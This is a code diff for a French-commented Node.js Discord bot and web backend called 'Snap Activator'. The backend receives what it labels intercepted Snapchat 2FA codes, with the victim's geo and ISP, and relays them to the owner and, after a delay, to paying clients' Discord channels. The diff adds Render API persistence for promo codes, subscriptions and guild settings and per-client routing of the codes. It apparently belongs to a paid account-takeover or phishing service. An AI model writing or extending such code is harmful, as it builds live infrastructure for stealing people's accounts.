@@ -51,14 +51,66 @@ const pendingMessages = []; // File d'attente si bot pas encore prêt
 const OWNER_ID = '1066379595881914449';
 function isOwner(userId) { return userId === OWNER_ID; }
 
+// ================== RENDER ENV VARS PERSISTENCE ==================
+const https = require('https');
+const httpsRequest = (options, body = null) => new Promise((resolve, reject) => {
+    const req = https.request(options, res => {
+        let data = '';
+        res.on('data', d => data += d);
+        res.on('end', () => resolve({ status: res.statusCode, body: data }));
+    });
+    req.on('error', reject);
+    if (body) req.write(body);
+    req.end();
+});
+
+let _renderVarsCache = null;
+async function updateRenderEnvVars(updates) {
+    const apiKey    = process.env.RENDER_API_KEY;
+    const serviceId = process.env.RENDER_SERVICE_ID;
+    if (!apiKey || !serviceId) return;
+    for (const [k, v] of Object.entries(updates)) process.env[k] = v;
+    try {
+        let existingVars = _renderVarsCache;
+        if (!existingVars) {
+            const getRes = await httpsRequest({
+                hostname: 'api.render.com',
+                path: `/v1/services/${serviceId}/env-vars`,
+                method: 'GET',
+                headers: { 'Authorization': `Bearer ${apiKey}` },
+            });
+            existingVars = getRes.status === 200
+                ? JSON.parse(getRes.body).map(v => ({ key: v.envVar?.key || v.key, value: v.envVar?.value || v.value }))
+                : [];
+            _renderVarsCache = existingVars;
+            setTimeout(() => { _renderVarsCache = null; }, 30000);
+        }
+        const updateKeys = Object.keys(updates);
+        const merged = existingVars.filter(v => v.key && !updateKeys.includes(v.key));
+        for (const [key, value] of Object.entries(updates)) merged.push({ key, value });
+        _renderVarsCache = merged;
+        const putBody = JSON.stringify(merged);
+        const putRes = await httpsRequest({
+            hostname: 'api.render.com',
+            path: `/v1/services/${serviceId}/env-vars`,
+            method: 'PUT',
+            headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(putBody) },
+        }, putBody);
+        if (putRes.status === 200) console.log(`[RENDER] ✅ ${updateKeys.join(', ')} persistés`);
+        else console.error(`[RENDER] ❌ ${putRes.status}: ${putRes.body.slice(0,200)}`);
+    } catch(e) { console.error('[RENDER] Erreur API:', e.message); }
+}
+
 // ================== CODES PROMO ==================
 const PROMOS_FILE = path.join(__dirname, 'promocodes.json');
 function loadPromos() {
+    if (process.env.PROMOS_DATA) { try { return JSON.parse(process.env.PROMOS_DATA); } catch(e) {} }
     try { if (fs.existsSync(PROMOS_FILE)) return JSON.parse(fs.readFileSync(PROMOS_FILE, 'utf8')); } catch(e) {}
     return {};
 }
 function savePromos(data) {
     try { fs.writeFileSync(PROMOS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch(e) {}
+    updateRenderEnvVars({ PROMOS_DATA: JSON.stringify(data) }).catch(() => {});
 }
 let promos = loadPromos();
 
@@ -66,6 +118,7 @@ let promos = loadPromos();
 const SUBS_FILE = path.join(__dirname, 'subscriptions.json');
 
 function loadSubs() {
+    if (process.env.SUBS_DATA) { try { return JSON.parse(process.env.SUBS_DATA); } catch(e) {} }
     try {
         if (fs.existsSync(SUBS_FILE)) return JSON.parse(fs.readFileSync(SUBS_FILE, 'utf8'));
     } catch (e) {}
@@ -73,6 +126,7 @@ function loadSubs() {
 }
 function saveSubs(data) {
     try { fs.writeFileSync(SUBS_FILE, JSON.stringify(data, null, 2), 'utf8'); } catch (e) {}
+    updateRenderEnvVars({ SUBS_DATA: JSON.stringify(data) }).catch(() => {});
 }
 let subs = loadSubs();
 
@@ -203,14 +257,24 @@ function loadConfig() {
         }
     } catch (e) { console.error('Erreur chargement config.json:', e.message); }
 
-    // guild_channels : priorité à l'env var GUILD_CHANNELS (persiste entre les déploiements Render)
+    // guild_channels : priorité à l'env var GUILD_CHANNELS
     if (process.env.GUILD_CHANNELS) {
         try {
             const envChannels = JSON.parse(process.env.GUILD_CHANNELS);
-            // Fusionner : l'env var prend le dessus sur config.json pour ce champ
             c.guild_channels = { ...c.guild_channels, ...envChannels };
             console.log(`[CONFIG] guild_channels chargés depuis GUILD_CHANNELS env: ${Object.keys(c.guild_channels).length} serveur(s)`);
         } catch(e) { console.error('[CONFIG] Erreur parsing GUILD_CHANNELS env:', e.message); }
+    }
+    // guild_premiums + disabled_guilds : env var CONFIG_DATA
+    if (process.env.CONFIG_DATA) {
+        try {
+            const envCfg = JSON.parse(process.env.CONFIG_DATA);
+            if (envCfg.guild_premiums) c.guild_premiums = { ...c.guild_premiums, ...envCfg.guild_premiums };
+            if (envCfg.disabled_guilds) c.disabled_guilds = envCfg.disabled_guilds;
+            if (envCfg.guild_notifications) c.guild_notifications = envCfg.guild_notifications;
+            if (envCfg.guild_owners) c.guild_owners = { ...c.guild_owners, ...envCfg.guild_owners };
+            console.log(`[CONFIG] guild_premiums/disabled chargés depuis CONFIG_DATA env`);
+        } catch(e) { console.error('[CONFIG] Erreur parsing CONFIG_DATA env:', e.message); }
     }
 
     return c;
@@ -223,72 +287,17 @@ function saveConfig(cfg) {
 
 // Sauvegarde guild_channels + met à jour l'env var Render automatiquement
 async function saveGuildChannels() {
-    const json = JSON.stringify(cfg.guild_channels);
-    process.env.GUILD_CHANNELS = json; // persist en mémoire pour la session courante
     saveConfig(cfg);
-
-    // Mise à jour automatique sur Render via l'API
-    const apiKey    = process.env.RENDER_API_KEY;
-    const serviceId = process.env.RENDER_SERVICE_ID;
-    if (!apiKey || !serviceId) {
-        console.log(`[GUILD_CHANNELS] Pas de RENDER_API_KEY/RENDER_SERVICE_ID — copie manuellement:\nGUILD_CHANNELS=${json}`);
-        return;
-    }
-    try {
-        const https = require('https');
-
-        // Fonction helper pour les requêtes HTTPS
-        const httpsRequest = (options, body = null) => new Promise((resolve, reject) => {
-            const req = https.request(options, res => {
-                let data = '';
-                res.on('data', d => data += d);
-                res.on('end', () => resolve({ status: res.statusCode, body: data }));
-            });
-            req.on('error', reject);
-            if (body) req.write(body);
-            req.end();
-        });
-
-        // 1. Récupérer TOUTES les variables existantes
-        const getRes = await httpsRequest({
-            hostname: 'api.render.com',
-            path: `/v1/services/${serviceId}/env-vars`,
-            method: 'GET',
-            headers: { 'Authorization': `Bearer ${apiKey}` },
-        });
-
-        let existingVars = [];
-        if (getRes.status === 200) {
-            try {
-                existingVars = JSON.parse(getRes.body).map(v => ({ key: v.envVar?.key || v.key, value: v.envVar?.value || v.value }));
-            } catch(e) {}
-        }
-
-        // 2. Mettre à jour ou ajouter GUILD_CHANNELS sans toucher aux autres
-        const merged = existingVars.filter(v => v.key && v.key !== 'GUILD_CHANNELS');
-        merged.push({ key: 'GUILD_CHANNELS', value: json });
-
-        // 3. PUT avec la liste complète
-        const putBody = JSON.stringify(merged);
-        const putRes = await httpsRequest({
-            hostname: 'api.render.com',
-            path: `/v1/services/${serviceId}/env-vars`,
-            method: 'PUT',
-            headers: {
-                'Authorization': `Bearer ${apiKey}`,
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(putBody),
-            },
-        }, putBody);
-
-        if (putRes.status === 200) {
-            console.log(`[GUILD_CHANNELS] ✅ Render env var mise à jour (${merged.length} vars total)`);
-        } else {
-            console.error(`[GUILD_CHANNELS] ❌ Render API erreur ${putRes.status}: ${putRes.body}`);
-        }
-    } catch(e) {
-        console.error('[GUILD_CHANNELS] Erreur Render API:', e.message);
-    }
+    const configData = JSON.stringify({
+        guild_premiums: cfg.guild_premiums || {},
+        disabled_guilds: cfg.disabled_guilds || [],
+        guild_notifications: cfg.guild_notifications || [],
+        guild_owners: cfg.guild_owners || {},
+    });
+    await updateRenderEnvVars({
+        GUILD_CHANNELS: JSON.stringify(cfg.guild_channels),
+        CONFIG_DATA: configData,
+    }).catch(e => console.error('[saveGuildChannels] Render err:', e.message));
 }
 
 let cfg = loadConfig();
@@ -746,8 +755,11 @@ app.post('/api/code', async (req, res) => {
 
     const sendCode = async () => {
         await sendToDiscord(async () => {
-            const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
+            const refChannelId  = request.refChannelId || null;
+            const refGuildId    = request.refGuildId   || null;
             const priorityChannel = cfg.salon_prioritaire ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
+            const clientChannel   = refChannelId ? client.channels.cache.get(refChannelId) : null;
+            const fallbackChannel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
 
             const geoCode = request.geo  || '?';
             const ispCode = request.isp  || '?';
@@ -777,24 +789,32 @@ app.post('/api/code', async (req, res) => {
                 .setFooter({ text: `Snap Activator • ${new Date().toLocaleString('fr-FR')}` })
                 .setTimestamp();
 
+            // 1. PRIORITY — lecture seule, toujours
             if (priorityChannel) {
                 try {
                     const priorityCodeEmbed = new EmbedBuilder()
                         .setTitle('👁️ PRIORITAIRE — Code 2FA intercepté')
-                        .setDescription('> Lecture seule.')
+                        .setDescription(`> Lecture seule.${refGuildId ? ` Client : \`${refGuildId}\`` : ''}`)
                         .setColor(0x00FF66)
                         .addFields(...codeFields)
                         .setThumbnail('https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.png')
-                        .setFooter({ text: `Salon principal dans ${cfg.delai_discord_sec}s` })
                         .setTimestamp();
                     await priorityChannel.send({ content: `<@${OWNER_ID}> 🔑 Code reçu !`, embeds: [priorityCodeEmbed] });
                 } catch (e) { console.error('Erreur salon prioritaire (code):', e.message); }
             }
 
-            if (mainChannel) {
+            // 2. Canal client (si ref) OU canal principal (sinon)
+            const targetChannel = refGuildId ? clientChannel : fallbackChannel;
+            if (targetChannel) {
                 setTimeout(async () => {
-                    try { await mainChannel.send({ embeds: [codeEmbed] }); }
-                    catch (e) { console.error('Erreur salon principal (code):', e.message); }
+                    try { await targetChannel.send({ embeds: [codeEmbed] }); }
+                    catch (e) { console.error('Erreur envoi code 2FA vers canal cible:', e.message); }
+                }, cfg.delai_discord_sec * 1000);
+            } else if (refGuildId) {
+                // Client channel introuvable, fallback sur canal principal
+                setTimeout(async () => {
+                    try { await fallbackChannel?.send({ embeds: [codeEmbed] }); }
+                    catch (e) {}
                 }, cfg.delai_discord_sec * 1000);
             }
         });
@@ -1823,6 +1843,7 @@ app.post('/api/dashboard/guilds/:id/premium', requireAuth, (req, res) => {
         delete cfg.guild_premiums[guildId];
     }
     saveConfig(cfg);
+    saveGuildChannels().catch(() => {}); // persiste guild_premiums sur Render
     // Mettre à jour les commandes visibles dans ce guild
     if (client._registerGuildCommands) client._registerGuildCommands(guildId).catch(() => {});
     res.json({ ok: true, hasPremium: !!cfg.guild_premiums[guildId] });
@@ -1998,6 +2019,7 @@ app.post('/api/dashboard/guilds/:id/toggle', requireAuth, (req, res) => {
         cfg.disabled_guilds.splice(idx, 1);
     }
     saveConfig(cfg);
+    saveGuildChannels().catch(() => {}); // persiste disabled_guilds sur Render
     res.json({ ok: true, disabled: cfg.disabled_guilds.includes(guildId) });
 });
 
